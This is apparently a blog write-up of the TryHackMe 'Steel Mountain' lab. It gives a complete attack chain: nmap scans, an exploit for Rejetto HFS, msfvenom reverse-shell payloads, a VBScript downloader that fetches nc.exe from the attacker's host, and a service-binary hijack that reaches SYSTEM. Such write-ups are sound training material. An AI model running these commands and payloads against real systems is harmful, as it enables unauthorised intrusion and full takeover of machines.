---
layout: post
title: TryHackMe - Steel Mountain
---

Room: [Steel Mountain](https://tryhackme.com/room/steelmountain)

## Enumeration

```
root@ip-10-10-71-9:~# nmap 10.10.139.244 -sC -sV -Pn

Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-31 21:08 GMT
Nmap scan report for ip-10-10-139-244.eu-west-1.compute.internal (10.10.139.244)
Host is up (0.00050s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl          Microsoft SChannel TLS
| [...]
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2020-10-11T19:04:29
|_Not valid after:  2021-04-12T19:04:29
|_ssl-date: 2021-01-31T21:10:08+00:00; 0s from scanner time.
8080/tcp  open  http         HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.60%I=7%D=1/31%Time=60171C80%P=x86_64-pc-linux-gnu%r(TL
[...]
MAC Address: 02:76:87:47:0C:73 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:76:87:47:0c:73 (unknown)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-31 21:10:08
|_  start_date: 2021-01-31 21:06:14

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.32 seconds
```

I first checked the website which was pretty bare besides an employee of the month picture. The source of the photo /img/BillHarper.png gave away his name, which I figured might be usable later.

The HTTP File Server on port 8080 also stood out to me, so I checked for exploits.

```
root@ip-10-10-71-9:~# searchsploit HFS 2.3
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
HFS Http File Server 2.3m Build 300 - Buffer  | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbi | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c | windows/webapps/34852.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

[Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution](https://www.exploit-db.com/exploits/34668) looked promising, so I thought to give it a try in Metasploit.

## Gaining Access

```
root@ip-10-10-71-9:~# msfconsole -q
msf5 > Interrupt: use the 'exit' command to quit
msf5 > search CVE-2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


msf5 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/http/rejetto_hfs_exec) > info

       Name: Rejetto HttpFileServer Remote Command Execution
     Module: exploit/windows/http/rejetto_hfs_exec
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2014-09-11

Provided by:
  Daniele Linguaglossa <danielelinguaglossa@gmail.com>
  Muhamad Fadzil Ramli <mind1355@gmail.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  HTTPDELAY  10               no        Seconds to wait before terminating web server
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT      80               yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       The path of the web application
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host

Payload information:
  Avoid: 3 characters

Description:
  Rejetto HttpFileServer (HFS) is vulnerable to remote command 
  execution attack due to a poor regex in the file ParserLib.pas. This 
  module exploits the HFS scripting commands by using '%00' to bypass 
  the filtering. This module has been tested successfully on HFS 2.3b 
  over Windows XP SP3, Windows 7 SP1 and Windows 8.

References:
  https://cvedetails.com/cve/CVE-2014-6287/
  OSVDB (111386)
  https://seclists.org/bugtraq/2014/Sep/85
  http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands

msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.139.244
RHOSTS => 10.10.139.244
msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.139.244
RHOSTS => 10.10.139.244
msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.71.9:4444 
[*] Using URL: http://0.0.0.0:8080/qQtYLw
[*] Local IP: http://10.10.71.9:8080/qQtYLw
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /qQtYLw
[*] Sending stage (176195 bytes) to 10.10.139.244
[*] Meterpreter session 1 opened (10.10.71.9:4444 -> 10.10.139.244:49215) at 2021-01-31 21:24:17 +0000
[!] Tried to delete %TEMP%cWDQMiMi.vbs, unknown result
[*] Server stopped.

meterpreter > ls
Listing: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
====================================================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2021-01-31 21:24:14 +0000  %TEMP%
100666/rw-rw-rw-  174     fil   2019-09-27 12:07:07 +0100  desktop.ini
100777/rwxrwxrwx  760320  fil   2019-09-27 10:24:35 +0100  hfs.exe


meterpreter > cat C:/Users/bill/Desktop/user.txt
{censored}
```

## Privilege Escalation

TryHackMe says to use the PowerUp powershell script to evaluate the Windows machine and determine any abnormalities. Sure thing!

```
root@ip-10-10-71-9:~# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
...

meterpreter > upload PowerUp.ps1
[*] uploading  : PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : PowerUp.ps1 -> PowerUp.ps1
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN/bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN/bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN/bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN/bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN/bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN/bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN/bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files
```

When the CanRestart option is set to true (like for AdvancedSystemCareService9) it allows one to restart a service on the system. The directory to the application is also write-able which means I can replace the legitimate application with a malicious one, restart the service, and try for escalated privileges. From the above, I determined the path to be C:\Program Files (x86)\IObit\ and the service executable was Advanced.exe. 

```
# Make the payload
root@ip-10-10-71-9:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.71.9 LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe

# Upload payload
PS > ^C
Terminate channel 4? [y/N]  y
meterpreter > cd "C:/Program Files (x86)/IObit"
meterpreter > upload Advanced.exe
[*] uploading  : Advanced.exe -> Advanced.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): Advanced.exe -> Advanced.exe
[*] uploaded   : Advanced.exe -> Advanced.exe

# Open a listener on AttackBox
root@ip-10-10-71-9:~# nc -nlvp 4443
Listening on [0.0.0.0] (family 0, port 4443)

# Restart the service
meterpreter > shell
Process 1816 created.
Channel 11 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

# Receive Connection on Listener
root@ip-10-10-71-9:~# nc -nlvp 4443
Listening on [0.0.0.0] (family 0, port 4443)
Connection from 10.10.139.244 49271 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

# Grab the Root flag
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
{censored}
```

The next challenge is to do the same without Metasploit.

## Gaining Access II

I first downloaded a [Windows netcat static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) and the [Python exploit code](https://www.exploit-db.com/exploits/39161). I renamed the binary to nc.exe to match the exploit code.

I updated the exploit.py script to include my IP address, noting the default local port to be 443. I also had to debug a bit. In the TryHackMe AttackBox, `python` defaults to `python3` and it took a minute before I realized that--I needed to specify `python2`. Also, due to how the in-browser AttackBox works, port 80 is in use and `pkill`-ing it will disconnect the box. The exploit code expects your webserver hosting nc.exe to be on port 80 so it required slight modification. I hosted on port 8080, and so I had to modify the vbs variable to change the URL the file was hosted at.

```
#URL Decoded Version
vbs = "C:\Users\Public\script.vbs|dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://" ip_addr "/nc.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\Public\nc.exe", 2 '//overwrite
end with"
```
Adding `:8080` to the end of the ip_addr just meant adding the URL encoded special character as such: `%3A8080`.
```
# Updated Line
vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%3A8080%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
```

I ran my listener and then my exploit script a couple times.
```
# Exploit
root@ip-10-10-64-137:~# python2 exploit.py
[.]Something went wrong..!
  Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
  Don't forgot to change the Local IP address and Port number on the script

root@ip-10-10-38-47:~# python2 exploit.py 10.10.93.178 8080
root@ip-10-10-38-47:~# python2 exploit.py 10.10.93.178 8080
root@ip-10-10-38-47:~# python2 exploit.py 10.10.93.178 8080

# Web Server
root@ip-10-10-38-47:~# sudo python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.93.178 - - [07/Feb/2021 22:10:23] "GET /nc.exe HTTP/1.1" 200 -
10.10.93.178 - - [07/Feb/2021 22:10:23] "GET /nc.exe HTTP/1.1" 200 -
10.10.93.178 - - [07/Feb/2021 22:10:23] "GET /nc.exe HTTP/1.1" 200 -
10.10.93.178 - - [07/Feb/2021 22:10:23] "GET /nc.exe HTTP/1.1" 200 -

# Listener
root@ip-10-10-64-137:~# sudo rlwrap nc -nlvp 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from 10.10.93.178 49276 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
```


```
# Download winPEAS to web server directory
root@ip-10-10-64-137:~# wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat

# Web Server
root@ip-10-10-64-137:~# sudo python -m http.server 8080
...
10.10.93.178 - - [07/Feb/2021 22:27:52] "GET /winPEAS.bat HTTP/1.1" 200 -

# Victim
root@ip-10-10-64-137:~# sudo rlwrap nc -nlvp 443
...
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>powershell -c "Invoke-WebRequest -Uri 'http://10.10.64.137:8080/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winPEAS.bat'"
powershell -c "Invoke-WebRequest -Uri 'http://10.10.64.137:8080/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winPEAS.bat'"

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd C:\Users\bill\Desktop
cd C:\Users\bill\Desktop

C:\Users\bill\Desktop>winPEAS.bat
```

WinPEAS's output is the same as when I ran it in the Metasploit section and the privilege escalation will be very similar, but uses `Invoke-WebRequest` to download the hosted payload instead of using meterpreter's `upload` command.

```
# Make the payload
root@ip-10-10-64-137:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.64.137 LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe

# Upload payload
C:\Users\bill\Desktop>powershell -c "Invoke-WebRequest -Uri 'http://10.10.64.137:8080/Advanced.exe' -OutFile 'C:/Program Files (x86)/IObit/Advanced.exe'"
powershell -c "Invoke-WebRequest -Uri 'http://10.10.64.137:8080/Advanced.exe' -OutFile 'C:/Program Files (x86)/IObit/Advanced.exe'"

# Open a listener on AttackBox
root@ip-10-10-64-137:~# nc -nlvp 4443
Listening on [0.0.0.0] (family 0, port 4443)

# Restart the service
C:\Users\bill\Desktop>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\Desktop>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

# Receive Connection on Listener
root@ip-10-10-64-137:~# nc -nlvp 4443
Listening on [0.0.0.0] (family 0, port 4443)
Connection from 10.10.139.244 49271 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

# Grab the Root flag
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
{censored}
```